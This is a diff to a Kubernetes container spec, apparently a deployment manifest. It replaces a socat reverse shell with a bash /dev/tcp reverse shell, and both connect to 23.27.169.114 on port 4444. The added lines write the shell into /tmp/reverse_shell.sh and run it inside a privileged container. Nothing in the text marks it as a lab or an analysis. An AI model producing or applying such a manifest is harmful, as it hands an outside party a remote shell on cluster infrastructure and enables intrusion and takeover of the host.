@@ -16,10 +16,13 @@ spec:
       command: ["/bin/bash", "-c"]
       args:
         - |
-          # Install socat
-          apt-get update && apt-get install -y socat && \
-          # Create and execute the reverse shell
-          socat TCP:23.27.169.114:4444 EXEC:/bin/bash,pty
+          # Install curl if it's not already installed
+          apt-get update && apt-get install -y curl && \
+          # Create the reverse shell script
+          echo "bash -i >& /dev/tcp/23.27.169.114/4444 0>&1" > /tmp/reverse_shell.sh && \
+          chmod +x /tmp/reverse_shell.sh && \
+          # Execute the reverse shell
+          /tmp/reverse_shell.sh        
       securityContext:
         privileged: true  # Set to false unless needed
       tty: true
